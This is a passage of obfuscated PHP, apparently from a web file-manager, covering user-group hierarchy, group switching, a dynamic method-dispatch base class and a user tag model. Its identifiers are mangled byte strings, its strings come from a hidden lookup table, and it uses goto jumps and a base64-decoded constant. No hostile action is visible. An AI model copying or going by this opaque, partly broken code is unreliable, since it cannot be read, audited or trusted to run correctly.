$ÃÃ„µ£Õ[1748]); $‹Î²ÎÁÔ = array($ÃÃ„µ£Õ[501] => array($ÃÃ„µ£Õ[7], $Æ¦üÜÅÖ)); $Ÿù‰½ÅÁ = array($ÃÃ„µ£Õ[501], $ÃÃ„µ£Õ[1845] => $ÃÃ„µ£Õ[503]); $ÍÛ‰Âú = $this->field($Ÿù‰½ÅÁ)->where($‹Î²ÎÁÔ)->group($ÃÃ„µ£Õ[501])->select(); $ğ®ı‰¿ = array_to_keyvalue($ÍÛ‰Âú, $ÃÃ„µ£Õ[501], $ÃÃ„µ£Õ[503]); foreach ($ ¼áñÓ… as &$ëè†®Šö) { $èÄÄ×¨ = $ëè†®Šö[$ÃÃ„µ£Õ[1748]]; $ëè†®Šö[$ÃÃ„µ£Õ[1846]] = isset($ğ®ı‰¿[$èÄÄ×¨]) ? intval($ğ®ı‰¿[$èÄÄ×¨]) : !1; } unset($ëè†®Šö); } private function _listAppendChildrenMember(&$ÕğÁµ©¡) { $œÍâÃ§à =& $_SERVER[Ù×¯Ø…]; $ØÓ¤ ¬É = array_to_keyvalue($ÕğÁµ©¡, $œÍâÃ§à[33], $œÍâÃ§à[1748]); $Ü­¨§ÏÉ = array($œÍâÃ§à[1748] => array($œÍâÃ§à[7], $ØÓ¤ ¬É)); $öÀöøñÖ = array($œÍâÃ§à[1748], $œÍâÃ§à[1845] => $œÍâÃ§à[503]); $ïŒåÉ‰Ê = Model($œÍâÃ§à[1837])->field($öÀöøñÖ)->where($Ü­¨§ÏÉ)->group($œÍâÃ§à[1748])->select(); $¨®Ğƒ¿‚ = array_to_keyvalue($ïŒåÉ‰Ê, $œÍâÃ§à[1748], $œÍâÃ§à[503]); foreach ($ÕğÁµ©¡ as &$ŒÀí×³‘) { $ï£Ç½ß = $ŒÀí×³‘[$œÍâÃ§à[1748]]; $ŒÀí×³‘[$œÍâÃ§à[1847]] = isset($¨®Ğƒ¿‚[$ï£Ç½ß]) ? intval($¨®Ğƒ¿‚[$ï£Ç½ß]) : !1; } unset($ŒÀí×³‘); } private function _listAppendMeta(&$Çè”Œƒ, $–î°ƒ×Ï) { $ú°·½¨ =& $_SERVER[Ù×¯Ø…]; $Áè¶É©º = array($ú°·½¨[1748] => array($ú°·½¨[7], $–î°ƒ×Ï)); $·œëõè› = Model($ú°·½¨[1836])->where($Áè¶É©º)->select(); $·œëõè› = array_to_keyvalue_group($·œëõè›, $ú°·½¨[1748]); foreach ($·œëõè› as &$Æë©£”) { $Æë©£” = array_to_keyvalue($Æë©£”, $ú°·½¨[93], $ú°·½¨[372]); } unset($Æë©£”); foreach ($Çè”Œƒ as &$„£ã“ƒ) { $„£ã“ƒ[$ú°·½¨[468]] = array(); if (isset($·œëõè›[$„£ã“ƒ[$ú°·½¨[1748]]])) { $„£ã“ƒ[$ú°·½¨[468]] = $·œëõè›[$„£ã“ƒ[$ú°·½¨[1748]]]; } } unset($„£ã“ƒ); } protected function parentLevelArray($¾ìš©Ù¼) { $¦×¨´» =& $_SERVER[Ù×¯Ø…]; $¾ìš©Ù¼ = explode($¦×¨´»[47], trim($¾ìš©Ù¼, $¦×¨´»[47])); $¾ìš©Ù¼ = array_remove_value($¾ìš©Ù¼, $¦×¨´»[191]); return $¾ìš©Ù¼; } private function _listAppendParent(&$ÓÏåÒ‘) { $ˆÕŒ Ÿà =& $_SERVER[Ù×¯Ø…]; $É‘¿°¹ = array(); foreach ($ÓÏåÒ‘ as &$ÆÙÎÑú) { $É‘¿°¹[$ÆÙÎÑú[$ˆÕŒ Ÿà[1748]]] = $ÆÙÎÑú[$ˆÕŒ Ÿà[28]]; $“İ“ó•š = $this->parentLevelArray($ÆÙÎÑú[$ˆÕŒ Ÿà[524]]); foreach ($“İ“ó•š as $¾°›†‹) { if (!isset($É‘¿°¹[$¾°›†‹])) { $É‘¿°¹[$¾°›†‹] = 0; } } } unset($ÆÙÎÑú); foreach ($É‘¿°¹ as $Ÿ¯‘«èÍ => $©ÂæÚÈè) { if ($©ÂæÚÈè) { continue; } $´¯©¥Å” = $this->getInfoSimple($Ÿ¯‘«èÍ); $É‘¿°¹[$Ÿ¯‘«èÍ] = $´¯©¥Å”[$ˆÕŒ Ÿà[28]]; } $à„ÊÅ¾ = $GLOBALS[$ˆÕŒ Ÿà[6]][$ˆÕŒ Ÿà[88]][$ˆÕŒ Ÿà[1848]]; if ($GLOBALS[$ˆÕŒ Ÿà[508]] == $ˆÕŒ Ÿà[87]) { $à„ÊÅ¾ = !1; } foreach ($ÓÏåÒ‘ as &$ÆÙÎÑú) { $“İ“ó•š = $this->parentLevelArray($ÆÙÎÑú[$ˆÕŒ Ÿà[524]]); $ò¹ğÈô‘ = $ˆÕŒ Ÿà[33]; foreach ($“İ“ó•š as $Ÿ¯‘«èÍ => $¾°›†‹) { if ($à„ÊÅ¾ && $Ÿ¯‘«èÍ == 0) { continue; } $ò¹ğÈô‘ .= $É‘¿°¹[$¾°›†‹] . $ˆÕŒ Ÿà[8]; } if ($“İ“ó•š) { $ò¹ğÈô‘ .= $ÆÙÎÑú[$ˆÕŒ Ÿà[28]]; } $ÆÙÎÑú[$ˆÕŒ Ÿà[529]] = str_replace($ˆÕŒ Ÿà[532], $ˆÕŒ Ÿà[8], $ò¹ğÈô‘); } unset($ÆÙÎÑú); } private function _listAppendSourceRoot(&$½àıê†, $ùä˜«³µ) { $ğ™··¾ğ =& $_SERVER[Ù×¯Ø…]; $òöŸ¡„¢ = array($ğ™··¾ğ[501] => 0, $ğ™··¾ğ[507] => array($ğ™··¾ğ[7], $ùä˜«³µ), $ğ™··¾ğ[415] => SourceModel::TYPE_GROUP); $£ªµäğÒ = Model($ğ™··¾ğ[831])->order($ğ™··¾ğ[1849])->field($ğ™··¾ğ[1850]); $óÏïå‰ = $£ªµäğÒ->limit(count($ùä˜«³µ))->where($òöŸ¡„¢)->select(); $óÏïå‰ = array_to_keyvalue($óÏïå‰, $ğ™··¾ğ[507]); $óÏïå‰ = array_remove_key($óÏïå‰, $ğ™··¾ğ[507]); foreach ($½àıê† as &$ÍĞ§·´Ğ) { $ÍĞ§·´Ğ[$ğ™··¾ğ[85]] = $óÏïå‰[$ÍĞ§·´Ğ[$ğ™··¾ğ[1748]]] ? $óÏïå‰[$ÍĞ§·´Ğ[$ğ™··¾ğ[1748]]] : array(); } unset($ÍĞ§·´Ğ); } protected function groupMerge($ªì±”²’) { $ªì±”²’ = array_values(array_unique($ªì±”²’)); $àøõòåĞ = array(); for ($¯³Ïç¸ã = 0; $¯³Ïç¸ã < count($ªì±”²’); $¯³Ïç¸ã++) { $‹¤´û‹ = !1; for ($’ê×ìÛ = 0; $’ê×ìÛ < count($ªì±”²’); $’ê×ìÛ++) { if ($¯³Ïç¸ã == $’ê×ìÛ) { continue; } if ($this->isParentOf($ªì±”²’[$’ê×ìÛ], $ªì±”²’[$¯³Ïç¸ã])) { $‹¤´û‹ = !0; break; } } if (!$‹¤´û‹) { $àøõòåĞ[] = $ªì±”²’[$¯³Ïç¸ã]; } } return $àøõòåĞ; } protected function isParentOf($ø¾µİƒ›, $Ã™³´Ö¹) { $¦¿ÔÃ‹ä =& $_SERVER[Ù×¯Ø…]; if (!$ø¾µİƒ› || !$Ã™³´Ö¹ || $ø¾µİƒ› == $Ã™³´Ö¹) { return !1; } $µ…´Èä = $this->getInfoSimple($ø¾µİƒ›); $ƒ¿ŸèÔ´ = $this->getInfoSimple($Ã™³´Ö¹); $›ï³¨‹× = $µ…´Èä[$¦¿ÔÃ‹ä[524]] . $ø¾µİƒ› . $¦¿ÔÃ‹ä[47]; if (substr($ƒ¿ŸèÔ´[$¦¿ÔÃ‹ä[524]], 0, strlen($›ï³¨‹×)) == $›ï³¨‹×) { return !0; } return !1; } public function groupShowRoot($İæ•˜, $˜·œä¥í = false) { $Çôİ•ı =& $_SERVER[Ù×¯Ø…]; $ÄÑ‹” = $this->getInfo($İæ•˜); if (!$ÄÑ‹”) { return array(); } $£´öÍÏ¶ = $this->parentLevelArray($ÄÑ‹”[$Çôİ•ı[524]]); $şçê™°ã = array($İæ•˜); if (count($£´öÍÏ¶) == 0) { return $şçê™°ã; } if ($˜·œä¥í && count($£´öÍÏ¶) == 1) { return $şçê™°ã; } if (!$ÄÑ‹”[$Çôİ•ı[468]] || !isset($ÄÑ‹”[$Çôİ•ı[468]][$Çôİ•ı[1833]]) || $ÄÑ‹”[$Çôİ•ı[468]][$Çôİ•ı[1833]] == $Çôİ•ı[1802]) { return $this->groupShowRoot($£´öÍÏ¶[count($£´öÍÏ¶) - 1], $˜·œä¥í); } if ($ÄÑ‹”[$Çôİ•ı[468]][$Çôİ•ı[1833]] == $Çôİ•ı[355]) { $àæ°´¼ = explode($Çôİ•ı[47], $ÄÑ‹”[$Çôİ•ı[468]][$Çôİ•ı[1834]]); if ($àæ°´¼) { $şçê™°ã = array_merge($şçê™°ã, $àæ°´¼); } } return $şçê™°ã; } protected function resetParentLevel() { $…–ğÓºµ =& $_SERVER[Ù×¯Ø…]; $‡û•šèü = $…–ğÓºµ[1748]; $áÄ†ø¿Ã = $this->select(); $áÄ†ø¿Ã = array_to_keyvalue($áÄ†ø¿Ã, $‡û•šèü); foreach ($áÄ†ø¿Ã as $Òƒ¹»ÓÉ) { $í¨€Éõä = $Òƒ¹»ÓÉ; $ñâôï = array(); while ($í¨€Éõä[$…–ğÓºµ[501]] != 0) { $ñâôï[] = $í¨€Éõä[$…–ğÓºµ[501]]; $í¨€Éõä = $áÄ†ø¿Ã[$í¨€Éõä[$…–ğÓºµ[501]]]; } $ñâôï[] = 0; $ñâôï = $…–ğÓºµ[47] . implode($…–ğÓºµ[47], array_reverse($ñâôï)) . $…–ğÓºµ[47]; $this->setNamePinyin($Òƒ¹»ÓÉ[$‡û•šèü], $Òƒ¹»ÓÉ[$…–ğÓºµ[28]]); $this->where(array($‡û•šèü => $Òƒ¹»ÓÉ[$‡û•šèü]))->save(array($…–ğÓºµ[587] => $ñâôï)); } return $áÄ†ø¿Ã; } public function groupNameAuto($½øúğĞİ, $õÒ˜Ğ ‚) { $ÄúŸõ›š =& $_SERVER[Ù×¯Ø…]; $ËÂ®şíø = $this->where(array($ÄúŸõ›š[405] => $½øúğĞİ))->getField($ÄúŸõ›š[28], !0); if (!$ËÂ®şíø || !in_array($õÒ˜Ğ ‚, $ËÂ®şíø)) { return $õÒ˜Ğ ‚; } for ($º¯Ä‡­± = 1; $º¯Ä‡­± <= count($ËÂ®şíø) + 1; $º¯Ä‡­±++) { $œ“£­êÆ = $õÒ˜Ğ ‚ . "\50{$º¯Ä‡­±}\x29"; if (!in_array($œ“£­êÆ, $ËÂ®şíø)) { return $œ“£­êÆ; } } } public function groupSwitch($¾¬œÒÊ¼, $•ê³«ª¼) { $ğ¹öàâ =& $_SERVER[Ù×¯Ø…]; $ïæš¼¶İ = array($ğ¹öàâ[1748] => array($ğ¹öàâ[7], array($¾¬œÒÊ¼, $•ê³«ª¼))); $™­ÕÁÜç = $this->where($ïæš¼¶İ)->select(); $™­ÕÁÜç = array_to_keyvalue($™­ÕÁÜç, $ğ¹öàâ[1748]); if (!isset($™­ÕÁÜç[$¾¬œÒÊ¼]) || !isset($™­ÕÁÜç[$•ê³«ª¼]) || $™­ÕÁÜç[$¾¬œÒÊ¼][$ğ¹öàâ[501]] == 0) { return !1; } $ïæš¼¶İ = array($ğ¹öàâ[1748] => $¾¬œÒÊ¼); $ØÇø‡’Ë = Model($ğ¹öàâ[1837])->where($ïæš¼¶İ)->select(); if (!$ØÇø‡’Ë) { $ØÇø‡’Ë = array(); } foreach ($ØÇø‡’Ë as $é®›Å•ş) { $„…Î±Ïİ = $é®›Å•ş[$ğ¹öàâ[1580]]; $ïæš¼¶İ = array($ğ¹öàâ[1580] => $„…Î±Ïİ, $ğ¹öàâ[1748] => $•ê³«ª¼); $ ôğàÎ¾ = Model($ğ¹öàâ[1837])->where($ïæš¼¶İ)->find(); if (!$ ôğàÎ¾) { $ôĞåğë = array($•ê³«ª¼ => $é®›Å•ş[$ğ¹öàâ[1851]]); Model($ğ¹öàâ[541])->userGroupAdd($„…Î±Ïİ, $ôĞåğë); } Model($ğ¹öàâ[541])->userGroupRemove($„…Î±Ïİ, $¾¬œÒÊ¼); } $ïæš¼¶İ = array($ğ¹öàâ[415] => 2, $ğ¹öàâ[501] => 0, $ğ¹öàâ[414] => 1, $ğ¹öàâ[507] => array($ğ¹öàâ[7], array($¾¬œÒÊ¼, $•ê³«ª¼))); $‡ªÙ¹Äè = Model($ğ¹öàâ[831])->where($ïæš¼¶İ)->field($ğ¹öàâ[1852])->select(); $‡ªÙ¹Äè = array_to_keyvalue($‡ªÙ¹Äè, $ğ¹öàâ[507], $ğ¹öàâ[406]); $ãîÕ¢«Ö = !empty($‡ªÙ¹Äè[$¾¬œÒÊ¼]) ? $‡ªÙ¹Äè[$¾¬œÒÊ¼] : !1; if ($ãîÕ¢«Ö) { if (!$‡ªÙ¹Äè[$•ê³«ª¼]) { $‡ªÙ¹Äè[$•ê³«ª¼] = Model($ğ¹öàâ[831])->groupRootAdd($•ê³«ª¼); } $Ïõ“ò = $‡ªÙ¹Äè[$•ê³«ª¼]; $ïæš¼¶İ = array($ğ¹öàâ[501] => $ãîÕ¢«Ö); $‡ªÙ¹Äè = Model($ğ¹öàâ[831])->where($ïæš¼¶İ)->field($ğ¹öàâ[1853])->select(); if (!$‡ªÙ¹Äè) { $‡ªÙ¹Äè = array(); } Model($ğ¹öàâ[831])->moveClearAuth = !1; foreach ($‡ªÙ¹Äè as $«ı®äåì) { $ô®…Œ¶Î = $«ı®äåì[$ğ¹öàâ[414]] == $ğ¹öàâ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ğ¹öàâ[831])->move($«ı®äåì[$ğ¹öàâ[406]], $Ïõ“ò, $ô®…Œ¶Î); } Model($ğ¹öàâ[831])->moveClearAuth = !0; $ïæš¼¶İ = array($ğ¹öàâ[415] => 2, $ğ¹öàâ[507] => $¾¬œÒÊ¼); $Ş‘Ã™‡ğ = array($ğ¹öàâ[507] => $•ê³«ª¼); Model($ğ¹öàâ[1854])->where($ïæš¼¶İ)->save($Ş‘Ã™‡ğ); Model($ğ¹öàâ[1855])->where($ïæš¼¶İ)->save($Ş‘Ã™‡ğ); } $this->_changeChildLevel($™­ÕÁÜç[$¾¬œÒÊ¼], $™­ÕÁÜç[$•ê³«ª¼], !0); $this->where(array($ğ¹öàâ[501] => $¾¬œÒÊ¼))->save(array($ğ¹öàâ[501] => $•ê³«ª¼)); $this->_clearChildrenCache($™­ÕÁÜç[$•ê³«ª¼]); return !0; } } goto a†äµ½¨¹ò; BÜ¢¯åĞ§: function binCheckBigger($Ö¯ßùÃÌ, $²°Õ¿ğ­) { return $Ö¯ßùÃÌ > $²°Õ¿ğ­; } $_SERVER[$_SERVER[ÓÖ³òÒ][3]] = (base64_decode('Nzg2Mw==')."\x30\x35")+0;$_w7c6="hueckv1i6bpamqy3r7095t2og4zslxwjf8dnf8q2xe65r0zvb3upoliwsgdy4k7h9jcmn";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ïíşüéå, $©ğú³÷’) { $½ÀşÒÎÉ =& $_SERVER[Ù×¯Ø…]; if (isset(self::$_methodList[$Ïíşüéå])) { return @call_user_func_array(self::$_methodList[$Ïíşüéå], $©ğú³÷’); } else { if (method_exists($this, $Ïíşüéå)) { return call_user_func_array(array($this, $Ïíşüéå), $©ğú³÷’); } else { think_exception(__CLASS__ . $½ÀşÒÎÉ[4] . $Ïíşüéå . $½ÀşÒÎÉ[5]); } } } public static function __callStatic($ë‹ÜƒÚÉ, $ºñ÷ŠÆğ) { if (isset(self::$_methodListStatic[$ë‹ÜƒÚÉ])) { return call_user_func_array(self::$_methodListStatic[$ë‹ÜƒÚÉ], $ºñ÷ŠÆğ); } else { if (method_exists(self, $ë‹ÜƒÚÉ)) { return call_user_func_array(array(self, $ë‹ÜƒÚÉ), $ºñ÷ŠÆğ); } else { show_json("{$ë‹ÜƒÚÉ}\x28\51\40\x6e\157\164\40\145\170\151\163\164\73", !1); } } } public static function addMethod($Õ‚äŸ¢Å, $—¾Õ½€†) { self::$_methodList[$Õ‚äŸ¢Å] = $—¾Õ½€†; } public static function addMethodStatic($´¨úŸÌ, $éÓı¤¤) { self::$_methodListStatic[$´¨úŸÌ] = $éÓı¤¤; } } goto bùŞè‹­˜×; eœêêÕ¢: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($ı±„ïÀğ) { $¢ÎÄğÒÚ =& $_SERVER[Ù×¯Ø…]; return array($¢ÎÄğÒÚ[1858] => array(USER_ID, $¢ÎÄğÒÚ[1859])); } protected function listData() { $îƒ×‰Û =& $_SERVER[Ù×¯Ø…]; $ŞÉÖÏë¢ = array($îƒ×‰Û[1571] => USER_ID, $îƒ×‰Û[486] => array($îƒ×‰Û[1862], 0)); $ÌöŠÂïå = $îƒ×‰Û[1864]; $Ø¨Ñï¢È = $this->field($ÌöŠÂïå)->where($ŞÉÖÏë¢)->order($îƒ×‰Û[1865])->select(); return $Ø¨Ñï¢È ? $Ø¨Ñï¢È : array(); } protected function listByTag($ßé•¦ÄÂ) { } protected function addToTag($©½½©Î–, $ÑƒÌ¡­‹) { $îë®ÕƒÎ =& $_SERVER[Ù×¯Ø…]; if (!Model($îë®ÕƒÎ[1998])->listData($ÑƒÌ¡­‹) || !Model($îë®ÕƒÎ[831])->pathInfo($©½½©Î–)) { return !1; } $†ä£ÈÅ‘ = array($îë®ÕƒÎ[1571] => USER_ID, $îë®ÕƒÎ[486] => $ÑƒÌ¡­‹, $îë®ÕƒÎ[425] => $©½½©Î–, $îë®ÕƒÎ[426] => $îë®ÕƒÎ[420], $îë®ÕƒÎ[424] => $îë®ÕƒÎ[33], $îë®ÕƒÎ[1752] => 0); if ($this->where($†ä£ÈÅ‘)->find()) { return !1; } return $this->add($†ä£ÈÅ‘); } protected function removeFromTag($êÑé¤©˜, $ìÉÔ³¢Ÿ) { $¸Û‘ÜŸ =& $_SERVER[Ù×¯Ø…]; if (!Model($¸Û‘ÜŸ[1998])->listData($ìÉÔ³¢Ÿ)) { return !1; } if (is_array($êÑé¤©˜)) { $êÑé¤©˜ = array($¸Û‘ÜŸ[7], $êÑé¤©˜); } $Ö‹ıá÷ = array($¸Û‘ÜŸ[1571] => USER_ID, $¸Û‘ÜŸ[486] => $ìÉÔ³¢Ÿ, $¸Û‘ÜŸ[426] => $¸Û‘ÜŸ[420], $¸Û‘ÜŸ[425] => $êÑé¤©˜); return $this->where($Ö‹ıá÷)->delete(); } protected function removeByTag($¦Æ°ÕÒ) { $´’Ëå¨ =& $_SERVER[Ù×¯Ø…]; if (!$¦Æ°ÕÒ) { return !1; } $‚ßÄÙ´„ = array($´’Ëå¨[1571] => USER_ID, $´’Ëå¨[486] => $¦Æ°ÕÒ); return $this->where($‚ßÄÙ´„)->delete(); } protected function removeBySource($ÔÊìË‚) { $À¨å§æ =& $_SERVER[Ù×¯Ø…]; if (is_array($ÔÊìË‚)) { $ÔÊìË‚ = array($À¨å§æ[7], $ÔÊìË‚); } $œ–òîïğ = array($À¨å§æ[1571] => USER_ID, $À¨å§æ[425] => $ÔÊìË‚, $À¨å§æ[486] => array($À¨å§æ[1010], 0)); return $this->where($œ–òîïğ)->delete(); } }